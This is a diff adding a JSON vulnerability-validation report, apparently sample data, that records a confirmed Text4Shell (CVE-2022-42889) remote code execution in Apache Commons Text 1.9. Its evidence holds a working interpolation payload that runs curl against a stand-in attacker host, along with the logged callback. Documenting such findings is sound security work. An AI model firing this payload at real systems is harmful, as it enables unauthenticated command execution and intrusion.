@@ -1,0 +1,86 @@
+{
+  "vxdfVersion": "1.0.0",
+  "id": "8a7b6c5d-4e3f-4210-9876-543210fedcba",
+  "generatedAt": "2025-05-17T21:00:00Z",
+  "generatorTool": {
+    "name": "VulnValidate Enterprise",
+    "version": "4.2.0"
+  },
+  "applicationInfo": {
+    "name": "Corporate Document Processing Service",
+    "version": "1.7.3",
+    "environment": "production"
+  },
+  "exploitFlows": [
+    {
+      "id": "12345678-90ab-cdef-1234-567890abcdef",
+      "title": "Text4Shell RCE via Apache Commons Text Interpolation",
+      "severity": {
+        "level": "CRITICAL",
+        "justification": "Critical severity due to remote code execution without authentication"
+      },
+      "category": "INJECTION",
+      "cwes": [94],
+      "validatedAt": "2025-05-17T20:50:00Z",
+      "affectedComponents": [
+        {
+          "name": "Apache Commons Text",
+          "componentType": "SOFTWARE_LIBRARY",
+          "version": "1.9",
+          "purl": "pkg:maven/org.apache.commons/commons-text@1.9",
+          "description": "Vulnerable third-party library with interpolation functionality",
+          "locations": [
+            {
+              "locationType": "SOURCE_CODE_UNIT",
+              "filePath": "pom.xml",
+              "startLine": 45,
+              "description": "Dependency declaration in Maven POM file"
+            }
+          ]
+        }
+      ],
+      "evidence": [
+        {
+          "evidenceType": "VULNERABLE_COMPONENT_SCAN_OUTPUT",
+          "validationMethod": "SOFTWARE_COMPOSITION_ANALYSIS_CONTEXTUAL_VALIDATION",
+          "description": "SCA tool initially identified commons-text 1.9 as vulnerable.",
+          "timestamp": "2025-05-17T10:30:00Z",
+          "data": {
+            "componentIdentifier": {
+              "name": "org.apache.commons:commons-text",
+              "version": "1.9",
+              "purl": "pkg:maven/org.apache.commons/commons-text@1.9"
+            },
+            "vulnerabilityIdentifiers": [
+              {
+                "idSystem": "CVE",
+                "idValue": "CVE-2022-42889"
+              }
+            ]
+          }
+        },
+        {
+          "evidenceType": "TEST_PAYLOAD_USED",
+          "validationMethod": "DYNAMIC_ANALYSIS_EXPLOIT",
+          "description": "Crafted input using vulnerable interpolators sent to an application endpoint.",
+          "timestamp": "2025-05-17T20:45:00Z",
+          "data": {
+            "payloadContent": "{\"jobName\": \"${script:javascript:java.lang.Runtime.getRuntime().exec('curl http://attacker-server.com/vxdf-proof/' + 'CVE-2022-42889')}\"}",
+            "payloadEncoding": "json_escaped",
+            "targetParameterOrLocation": "HTTP POST body, jobName field"
+          }
+        },
+        {
+          "evidenceType": "OTHER_EVIDENCE",
+          "validationMethod": "DYNAMIC_ANALYSIS_EXPLOIT",
+          "description": "Callback received on attacker-controlled server, confirming RCE via Text4Shell.",
+          "timestamp": "2025-05-17T20:45:05Z",
+          "data": {
+            "dataTypeDescription": "External interaction proof showing command execution",
+            "dataContent": "GET /vxdf-proof/CVE-2022-42889 HTTP/1.1 received from target server, confirming command execution"
+          }
+        }
+      ]
+    }
+  ]
+} 
